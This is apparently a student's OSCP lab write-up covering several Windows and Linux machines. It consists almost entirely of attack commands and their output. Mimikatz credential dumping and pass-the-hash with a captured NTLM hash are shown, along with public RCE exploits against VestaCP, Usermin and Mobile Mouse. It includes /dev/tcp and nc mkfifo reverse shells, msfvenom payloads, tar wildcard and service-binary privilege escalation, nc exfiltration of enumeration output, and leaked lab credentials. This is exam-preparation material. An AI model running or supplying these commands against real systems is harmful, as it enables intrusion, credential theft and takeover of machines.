#Got Admin shell 154

upload mimicatz.exe
 .\mimicatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  * Username    : Administrator
         * Domain   : OSCP
         * NTLM       : 59b280ba707d22e3ef0aa587fc29ffe5
         
         
evil-winrm -i 10.10.117.152 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
#Got 152 proof.txt

```

## OSCPC 1- FTP file metadata, Vesta - Linux 156

```jsx
192.168.221.156 - FTP file metadata, Vesta 

OSCPC - Vesta Control Panel,Oneliner - Linux

Nmap
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Exim smtpd 4.90_1
53/tcp   open  domain   ISC BIND 9.11.3-1ubuntu1.18 (Ubuntu Linux)
80/tcp   open  http     nginx
|_http-title: oscp.exam &mdash; Coming Soon
110/tcp  open  pop3     Dovecot pop3d\
143/tcp  open  imap     Dovecot imapd (Ubuntu)\
465/tcp  open  ssl/smtp Exim smtpd 4.90_1
587/tcp  open  smtp     Exim smtpd 4.90_1
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2525/tcp open  smtp     Exim smtpd 4.90_1
3306/tcp open  mysql    MySQL 5.7.40-0ubuntu0.18.04.1
8080/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)
8083/tcp open  http     nginx
|_http-title: Did not follow redirect to https://192.168.229.156:8083/
8443/tcp open  http     Apache httpd 2.4.29 ((Ubuntu) mod_fcgid/2.3.9 OpenSSL/1.1.1)

Using SSL certificate identified 
admin@oscp.example.com, some .pem file, nothing move forward

mysql -h 192.168.221.156 -u admin, then try -p as well
ERROR 1045 (28000): Access denied for user 'admin'@'192.168.45.220' (using password: NO)

Using nikto found that 
nikto -h http://oscp.exam/
http://oscp.exam/phpmyadmin/index.php
http://oscp.exam/phpmyadmin/changelog.php

#Hint Last night i saw that SNMP port is open
snmpwalk -c public -v1 192.168.221.156 NET-SNMP-EXTEND-MIB::nsExtendObjects
Creds - jack:3PUKsX98BMupBiCf 

#Logged in with https://oscp.exam:8083/list/user/
Vesta using Jack creds - jack@oscp.exam

In this link https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/, copied last 3 codes saved all 3 codes into the same folder
python3 vestaROOT.py https://192.168.221.156:8083 Jack 3PUKsX98BMupBiCf
#Got ROOT Shell

But this shell not interactive
sh -i >& /dev/tcp/192.168.45.220/4455 0>&1 
rlwrap nc -nlvp 4455
#GOT INTERACTIVE ROOT SHELL

```

## OSCPC 2 - Usermin, wildcard, tar  - Linux 157

```jsx
OSCPC - Usermin, wildcard, tar - Linux
Nmap
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)

Based on the Miniserv or usermin seen on the browser, found the exploit 50234.py
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f;".format(listen_ip,listen_port)
"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.220 1337 >/tmp/f;".format(listen_ip,listen_port)

# Hint find the username using using files, files are found the using exiftool
exiftool FUNCTION-TEMPLATE.pdf | grep Author
Author  : Cassie

SSH login
First tried with public exploit
50234.py changed
listen_ip = "192.168.45.161"
listen_port = 1337 

python3 50234.py -u 192.168.157.157 -l cassie -p cassie 

#Error is 
python3 userminRCE.py -u 192.168.157.157 -l cassie -p cassie -lh 192.168.45.161 -lp 1337
#rlwrap nc -nlvp 1337
#Got shell

Tried to getting from ssh shell but keys are asking for password, tried with cassie as password but no luck

Priv Esc
linpeas.sh 
Some exploits
But their is grep "CRON" /var/log/syslog
Oct 14 02:16:01 oscp CRON[3716]: (root) CMD (cd /opt/admin && tar -zxf /tmp/backup.tar.gz *)
Oct 14 02:16:01 oscp CRON[3715]: (CRON) info (No MTA installed, discarding output)
Oct 14 02:17:01 oscp CRON[11609]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)

cd /opt/admin cassie
echo "/bin/chmod 4755 /bin/bash" > shell.sh 
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
./shell.sh
/bin/chmod: changing permissions of '/bin/bash': Operation not permitted

Based on grep "CRON" /var/log/syslog has some file tar -zxf /tmp/backup.tar.gz *
tar cf /tmp/backup.tar.gz *
/bin/chmod: changing permissions of '/bin/bash': Operation not permitted

tar cf backup.tar.gz *
ls -l
total 24
-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint-action=exec=sh shell.sh'
-rw-r--r-- 1 cassie cassie     1 Oct 14 03:18 '--checkpoint=1'
-rw-r--r-- 1 cassie cassie 10240 Oct 14 03:48  backup.tar.gz
-rwxr-xr-x 1 cassie cassie    26 Oct 14 03:17  shell.sh

ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash

/bin/bash -p
uid=1000(cassie) gid=1000(cassie) euid=0(root) groups=1000(cassie),4(adm),24(cdrom),30(dip),46(plugdev)
#Got ROOT shell

```

## OSCPC 3 - Mobile mouse,  GPGOrchestrator, GPGService.exe, Service  - Windows 155

```jsx
192.168.229.155 
OSCPC - Mobile mouse,  GPGOrchestrator, GPGService.exe, Service - Windows

Nmap 
# Nmap 7.94SVN scan initiated Wed Oct  9 11:20:04 2024 as: nmap -sC -sV --open -p- -T4 -A -oN Nmap/Pascha155 -Pn 192.168.229.155
Nmap scan report for 192.168.229.155
Host is up (0.048s latency).
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
9099/tcp  open  unknown
9999/tcp  open  abyss?
35913/tcp open  unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Dir Buster No dir found 
gobuster dir -u http://192.168.229.155/ -w /usr/share/wordlists/dirb/big.txt 
gobuster dir -u http://192.168.229.155:9099/ -w /usr/share/wordlists/dirb/big.txt 
gobuster dir -u http://192.168.229.155:9999/ -w /usr/share/wordlists/dirb/big.txt 

Port 9099 found mouse exploit

50972.py -WiFi Mouse 1.7.8.5 - Remote Code Execution
51010.py -Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)

#Started python server and smbserver
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.220 LPORT=1234 -f exe > shell1234.exe
impacket-smbserver share . -smb2support
python3 -m http.server 8080
No response from this exploits https://github.com/blue0x1/mobilemouse-exploit, https://raw.githubusercontent.com/lof1sec/mobile_mouse_rce/refs/heads/main/mobile_mouse_rce.py 

#After checking the Discord chat some clue
msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=192.168.45.220 LPORT=443 -f exe -o shell.exe
python3 mobile_mouse_rce.py --target 192.168.242.155 --lhost 192.168.45.161 --file shell.exe
rlwrap nc -nlvp 443 
#Got shell

iwr -uri http://192.168.45.161:8080/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
iwr -uri http://192.168.45.161:8080/nc.exe -Outfile nc.exe
windows>Get-Content .\155winPEAS.txt | .\nc.exe 192.168.45.161 1122
kali# nc -lvp 1122 < 155winPEAS.txt

#Priv Esc
Tried one 

---------------------------------------------
OneDrive(7260)[C:\Users\Tim\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: Tim
    Permissions: Tim [AllAccess]
    Possible DLL Hijacking folder: C:\Users\Tim\AppData\Local\Microsoft\OneDrive (Tim [AllAccess])
    Command Line: "C:\Users\Tim\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background

C:\Users\Tim\AppData\Local\Microsoft\OneDrive\OneDrive.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                           BUILTIN\Administrators:(I)(F)
                                                           OSCP\Tim:(I)(F)
--------------------------------------------------------------Same tim user with shell

Installed Applications --Via Program Files/Uninstall registry--
    C:\Program Files\MilleGPG5(Users [WriteData/CreateFiles])                                     
GPGOrchestrator(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Users [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [WriteData/CreateFiles])
--------------------------------------------------------------Same tim user with shell

https://raw.githubusercontent.com/lof1sec/mobile_mouse_rce/refs/heads/main/mobile_mouse_rce.py

msfvenom -p windows/shell_reverse_tcp -a x86 --encoder /x86/shikata_ga_nai LHOST=192.168.45.220 LPORT=443 -f exe -o shell.exe

#Replaced the msfvenom payload with the GPGService.exe then
#The service name mention mentioned at starting as GPGOrchestrator

rlwrap nc -nlvp 443
Restart-Service 'GPGOrchestrator'
#Got Admin Shell

   
```